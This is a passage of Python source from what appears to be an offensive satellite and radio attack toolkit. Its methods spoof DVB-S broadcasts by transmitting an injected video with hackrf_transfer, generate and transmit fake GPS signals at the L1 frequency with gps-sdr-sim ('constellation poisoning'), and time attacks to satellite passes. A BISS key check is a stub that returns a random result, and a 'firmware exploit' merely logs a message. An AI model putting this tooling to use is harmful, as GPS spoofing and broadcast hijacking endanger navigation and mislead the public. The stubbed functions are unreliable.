    self.attack_log.append(f"[FIRMWARE EXPLOIT] Exploiting firmware of {satellite_name}")
    return True

### Helper Functions ###
def get_tle(self, satellite_name: str, simulate: bool = False) -> Tuple[str, str]:
    """Fetch or cache satellite TLE data with optional simulation."""
    cache_path = "/tmp/tle_cache.json"
    if not hasattr(self, "_tle_cache"):
        self._tle_cache = {}
    if os.path.exists(cache_path):
        try:
            with open(cache_path, "r") as f:
                self._tle_cache = json.load(f)
        except json.JSONDecodeError:
            self._tle_cache = {}

    if satellite_name in self._tle_cache:
        return tuple(self._tle_cache[satellite_name])

    if simulate:
        return (
            "1 25544U 98067A   24045.54747685  .00001264  00000+0  29605-4 0  9991",
            "2 25544  51.6411 142.0286 0008934  57.6204  61.7222 15.50229859390342"
        )

    try:
        url = f"https://celestrak.org/NORAD/elements/gp.php?NAME={satellite_name}&FORMAT=TLE"
        response = requests.get(url, timeout=3)
        lines = response.text.strip().splitlines()
        if len(lines) >= 2:
            self._tle_cache[satellite_name] = lines[:2]
            with open(cache_path, "w") as f:
                json.dump(self._tle_cache, f)
            return tuple(lines[:2])
    except Exception as e:
        self.attack_log.append(f"[TLE FETCH ERROR] {e}")
    return ("", "")


def measure_signal_strength(self, frequency: float, simulate: bool = False) -> float:
    """Measure signal strength via rtl_power or mock."""
    if simulate:
        return random.uniform(-85, -40)
    try:
        subprocess.run([
            "rtl_power", "-f", f"{int(frequency)}:{int(frequency)}:1k",
            "-g", "20", "-i", "1", "-e", "1s", "/tmp/pwr.csv"
        ], check=True)
        with open("/tmp/pwr.csv") as f:
            last_line = f.readlines()[-1].strip().split(",")
            return float(last_line[-1])
    except Exception as e:
        self.attack_log.append(f"[RSSI ERROR] {e}")
        return -999.0


def detect_modulation(self, frequency: float, simulate: bool = False) -> str:
    """Detect modulation using CLI tool or simulation."""
    if simulate:
        return random.choice(["QPSK", "BPSK", "FM", "16QAM"])
    try:
        subprocess.run(["modulation_detector", "--freq", str(int(frequency))], check=True)
        with open("/tmp/modulation_result.txt") as f:
            return f.read().strip()
    except Exception as e:
        self.attack_log.append(f"[MOD DETECT ERROR] {e}")
        return "UNKNOWN"



def generate_ips(self, ip_range: str, simulate: bool = False) -> List[str]:
    """Generate IPs from CIDR or dash notation."""
    import ipaddress
    try:
        if "-" in ip_range:
            start_ip, end_ip = ip_range.split("-")
            start = ipaddress.IPv4Address(start_ip.strip())
            end = ipaddress.IPv4Address(end_ip.strip())
            return [str(ip) for ip in ipaddress.summarize_address_range(start, end)]
        else:
            net = ipaddress.ip_network(ip_range, strict=False)
            return [str(ip) for ip in net.hosts()]
    except Exception as e:
        self.attack_log.append(f"[IP GEN ERROR] {e}")
        return ["10.0.0.1", "10.0.0.2"] if simulate else []


def verify_biss_key(self, ts_data: bytes, key: str) -> bool:
    """Verify a BISS key against transport stream data."""
    # Placeholder; assumes BISS decryption logic
    return random.choice([True, False])
    
def show_signal_spectrogram(self, iq_file: str) -> bool:
    """Visualize signal IQ as a spectrogram and save to /tmp/spectrogram.png."""
    import matplotlib.pyplot as plt
    import numpy as np

    if not os.path.exists(iq_file):
        self.attack_log.append(f"[SPECTROGRAM] File not found: {iq_file}")
        return False

    try:
        with open(iq_file, "rb") as f:
            data = np.frombuffer(f.read(), dtype=np.uint8)
        
        if data.size == 0:
            self.attack_log.append("[SPECTROGRAM] Empty IQ file.")
            return False

        plt.figure(figsize=(10, 5))
        plt.specgram(data, NFFT=256, Fs=2e6, noverlap=128, cmap='plasma')
        plt.title("Signal Spectrogram")
        plt.xlabel("Time")
        plt.ylabel("Frequency")
        plt.colorbar(label='dB')
        plt.tight_layout()
        plt.savefig("/tmp/spectrogram.png")
        plt.close()
        self.attack_log.append("[SPECTROGRAM] Saved to /tmp/spectrogram.png")
        return True

    except Exception as e:
        self.attack_log.append(f"[SPECTROGRAM ERROR] {e}")
        return False


def dvbs_spoof_ffmpeg(self, frequency: float, symbol_rate: int, video_file: str, duration: int = 60) -> bool:
    """
    DVB-S spoofing using ffmpeg pipeline and dvbsnoop for stream injection.
    
    Args:
        frequency: Target frequency in Hz
        symbol_rate: Symbol rate in symbols/second
        video_file: Path to video file to inject
        duration: Duration in seconds
    
    Returns:
        bool: True if attack executed successfully
    """
    simulate = getattr(self, 'simulate_mode', False)
    
    if simulate:
        self.attack_log.append(f"[DRY RUN] DVB-S Spoof: freq={frequency/1e6}MHz, SR={symbol_rate}, video={video_file}, duration={duration}s")
        return True
    
    if not os.path.exists(video_file):
        self.attack_log.append(f"[DVB-S SPOOF] Video file not found: {video_file}")
        return False
    
    if not shutil.which("ffmpeg"):
        self.attack_log.append("[DVB-S SPOOF] ffmpeg not installed")
        return False
    
    try:
        ts_file = "/tmp/malicious_dvbs.ts"
        
        ffmpeg_cmd = [
            "ffmpeg", "-re", "-i", video_file,
            "-c:v", "mpeg2video", "-b:v", "2M",
            "-c:a", "mp2", "-b:a", "192k",
            "-f", "mpegts", ts_file, "-y"
        ]
        
        self.attack_log.append(f"[DVB-S SPOOF] Encoding video to MPEG-TS: {video_file}")
        result = subprocess.run(ffmpeg_cmd, capture_output=True, timeout=30)
        
        if result.returncode != 0:
            self.attack_log.append(f"[DVB-S SPOOF] ffmpeg encoding failed: {result.stderr.decode()[:200]}")
            return False
        
        if not os.path.exists(ts_file):
            self.attack_log.append("[DVB-S SPOOF] MPEG-TS file not created")
            return False
        
        if shutil.which("hackrf_transfer"):
            iq_file = "/tmp/dvbs_modulated.iq"
            
            self.attack_log.append(f"[DVB-S SPOOF] Modulating transport stream")
            
            proc = subprocess.Popen([
                "hackrf_transfer", "-t", ts_file, "-f", str(int(frequency)),
                "-s", str(symbol_rate), "-x", "47"
            ])
            
            self.active_attacks.append(proc)
            threading.Timer(duration, proc.terminate).start()
            
            self.attack_log.append(f"[DVB-S SPOOF] Transmitting on {frequency/1e6} MHz for {duration}s")
            return True
        else:
            self.attack_log.append("[DVB-S SPOOF] hackrf_transfer not available, TS file created at: " + ts_file)
            return True
        
    except subprocess.TimeoutExpired:
        self.attack_log.append("[DVB-S SPOOF] ffmpeg encoding timeout")
        return False
    except Exception as e:
        self.attack_log.append(f"[DVB-S SPOOF ERROR] {e}")
        return False


def orbit_aware_targeting(self, satellite_name: str, observer_lat: float, observer_lon: float, observer_alt: float = 0.0, attack_window: int = 300) -> Dict[str, Any]:
    """
    Orbit-aware targeting using PyEphem/Skyfield for satellite pass prediction.
    
    Args:
        satellite_name: Target satellite name
        observer_lat: Observer latitude (degrees)
        observer_lon: Observer longitude (degrees)
        observer_alt: Observer altitude (meters)
        attack_window: Attack window duration in seconds
    
    Returns:
        dict: Pass prediction data with optimal attack timing
    """
    simulate = getattr(self, 'simulate_mode', False)
    
    if simulate:
        self.attack_log.append(f"[DRY RUN] Orbit Targeting: {satellite_name} from ({observer_lat}, {observer_lon})")
        return {
            "satellite": satellite_name,
            "next_pass_start": str(datetime.now() + timedelta(hours=1)),
            "max_elevation": 45.0,
            "duration": 600,
            "optimal_attack_time": str(datetime.now() + timedelta(hours=1, minutes=5))
        }
    
    try:
        tle = self.get_tle(satellite_name)
        if not tle:
            self.attack_log.append(f"[ORBIT TARGET] TLE not found for {satellite_name}")
            return {"error": "TLE not found"}
        
        ts = load.timescale()
        sat = EarthSatellite(tle[0], tle[1], satellite_name, ts)
        observer = wgs84.latlon(observer_lat, observer_lon, observer_alt)
        
        t0 = ts.now()
        t1 = ts.utc(t0.utc_datetime() + timedelta(hours=24))
        
        times = ts.utc_range(t0, t1, step=60)
        
        difference = sat - observer
        
        max_elevation = -90
        best_time = None
        pass_start = None
        pass_end = None
        
        for i, t in enumerate(times):
            topocentric = difference.at(t)
            alt, az, distance = topocentric.altaz()
            
            if alt.degrees > 0:
                if pass_start is None:
                    pass_start = t
                
                if alt.degrees > max_elevation:
                    max_elevation = alt.degrees
                    best_time = t
                
                pass_end = t
            elif pass_start is not None:
                break
        
        if best_time:
            result = {
                "satellite": satellite_name,
                "next_pass_start": pass_start.utc_iso(),
                "next_pass_end": pass_end.utc_iso(),
                "max_elevation": max_elevation,
                "optimal_attack_time": best_time.utc_iso(),
                "attack_window": attack_window
            }
            
            self.attack_log.append(f"[ORBIT TARGET] Next pass for {satellite_name}: {max_elevation:.1f}° elevation at {best_time.utc_iso()}")
            return result
        else:
            self.attack_log.append(f"[ORBIT TARGET] No pass found in next 24h for {satellite_name}")
            return {"error": "No pass found"}
        
    except Exception as e:
        self.attack_log.append(f"[ORBIT TARGET ERROR] {e}")
        return {"error": str(e)}


def gnss_constellation_poisoning(self, lat: float, lon: float, alt: float = 10.0, num_satellites: int = 8, duration: int = 120, offset_km: float = 5.0) -> bool:
    """
    GNSS constellation poisoning - simulate multiple satellite signals at specific coordinates.
    
    Args:
        lat: Target latitude
        lon: Target longitude
        alt: Target altitude (meters)
        num_satellites: Number of fake satellites to simulate
        duration: Duration in seconds
        offset_km: Position offset for each satellite in km
    
    Returns:
        bool: True if attack executed successfully
    """
    simulate = getattr(self, 'simulate_mode', False)
    
    if simulate:
        self.attack_log.append(f"[DRY RUN] GNSS Constellation Poisoning: ({lat},{lon}), {num_satellites} satellites, offset={offset_km}km, duration={duration}s")
        return True
    
    if not shutil.which("gps-sdr-sim"):
        self.attack_log.append("[GNSS POISON] gps-sdr-sim not installed")
        return False
    
    try:
        self.attack_log.append(f"[GNSS POISON] Deploying {num_satellites} fake satellites at ({lat},{lon})")
        
        processes = []
        
        for i in range(num_satellites):
            offset_lat = lat + (offset_km / 111.0) * (random.random() - 0.5)
            offset_lon = lon + (offset_km / (111.0 * abs(lat) + 0.1)) * (random.random() - 0.5)
            
            iq_file = f"/tmp/gnss_poison_{i}.iq"
            
            cmd = [
                "gps-sdr-sim", 
                "-e", "brdc3540.15n",
                "-l", f"{offset_lat},{offset_lon},{alt}",
                "-b", str(i * 5),
                "-o", iq_file
            ]
            
            self.attack_log.append(f"[GNSS POISON] Generating satellite {i+1} at ({offset_lat:.4f},{offset_lon:.4f})")
            
            result = subprocess.run(cmd, capture_output=True, timeout=15)
            
            if result.returncode != 0:
                self.attack_log.append(f"[GNSS POISON] Satellite {i+1} generation failed: {result.stderr.decode()[:100]}")
                continue
            
            if shutil.which("hackrf_transfer") and os.path.exists(iq_file):
                proc = subprocess.Popen([
                    "hackrf_transfer", "-t", iq_file,
                    "-f", "1575420000",
                    "-s", "2600000",
                    "-x", "47"
                ])
                
                processes.append(proc)
                self.active_attacks.append(proc)
        
        if processes:
            def terminate_all():
                for proc in processes:
                    try:
                        proc.terminate()
                    except Exception:
                        pass
            
            threading.Timer(duration, terminate_all).start()
            
            self.attack_log.append(f"[GNSS POISON] Transmitting {len(processes)} satellite signals for {duration}s")
            return True
        else:
            self.attack_log.append("[GNSS POISON] No satellites transmitted")
            return False
        
    except subprocess.TimeoutExpired:
        self.attack_log.append("[GNSS POISON] Signal generation timeout")
        return False
    except Exception as e:
        self.attack_log.append(f"[GNSS POISON ERROR] {e}")
        return False


def satnogs_pass_prediction(self, satellite_norad_id: int, ground_station_lat: float, ground_station_lon: float, ground_station_alt: float = 0.0, min_elevation: float = 10.0) -> Dict[str, Any]:
    """
    Use SatNOGS data for satellite pass prediction.
    
    Args:
        satellite_norad_id: NORAD catalog ID
        ground_station_lat: Ground station latitude
        ground_station_lon: Ground station longitude
        ground_station_alt: Ground station altitude (meters)
        min_elevation: Minimum elevation for pass (degrees)
    
    Returns:
        dict: Pass prediction data
    """
    simulate = getattr(self, 'simulate_mode', False)
    
    if simulate:
        self.attack_log.append(f"[DRY RUN] SatNOGS Pass Prediction: NORAD {satellite_norad_id}, min_elev={min_elevation}°")
        return {
            "norad_id": satellite_norad_id,
            "next_pass_start": str(datetime.now() + timedelta(hours=2)),
            "max_elevation": 35.0,
            "duration": 480
        }
    
    try:
        tle_url = f"https://celestrak.org/NORAD/elements/gp.php?CATNR={satellite_norad_id}&FORMAT=TLE"
        response = requests.get(tle_url, timeout=10)
        
        if response.status_code != 200:
            self.attack_log.append(f"[SATNOGS PASS] Failed to fetch TLE for NORAD {satellite_norad_id}")
            return {"error": "TLE fetch failed"}
        
        tle_lines = response.text.splitlines()
        if len(tle_lines) < 2:
            self.attack_log.append(f"[SATNOGS PASS] Invalid TLE data for NORAD {satellite_norad_id}")
            return {"error": "Invalid TLE"}
        
        ts = load.timescale()
        sat = EarthSatellite(tle_lines[0], tle_lines[1], f"SAT_{satellite_norad_id}", ts)
        observer = wgs84.latlon(ground_station_lat, ground_station_lon, ground_station_alt)
        
        t0 = ts.now()
        t1 = ts.utc(t0.utc_datetime() + timedelta(hours=48))
        
        times = ts.utc_range(t0, t1, step=60)
        
        difference = sat - observer
        
        passes = []
        current_pass = None
        
        for t in times:
            topocentric = difference.at(t)
            alt, az, distance = topocentric.altaz()
            
            if alt.degrees >= min_elevation:
                if current_pass is None:
                    current_pass = {
                        "start": t.utc_iso(),
                        "max_elevation": alt.degrees,
                        "max_time": t.utc_iso()
                    }
                else:
                    if alt.degrees > current_pass["max_elevation"]:
                        current_pass["max_elevation"] = alt.degrees
                        current_pass["max_time"] = t.utc_iso()
                    
                    current_pass["end"] = t.utc_iso()
            elif current_pass is not None:
                passes.append(current_pass)
                current_pass = None
        
        if passes:
            next_pass = passes[0]
            self.attack_log.append(f"[SATNOGS PASS] Next pass at {next_pass['start']} with {next_pass['max_elevation']:.1f}° elevation")
            return {
                "norad_id": satellite_norad_id,
                "next_pass": next_pass,
                "all_passes": passes[:5]
            }
        else:
            self.attack_log.append(f"[SATNOGS PASS] No passes above {min_elevation}° in next 48h")
            return {"error": "No passes found"}
        
    except Exception as e:
        self.attack_log.append(f"[SATNOGS PASS ERROR] {e}")
        return {"error": str(e)}


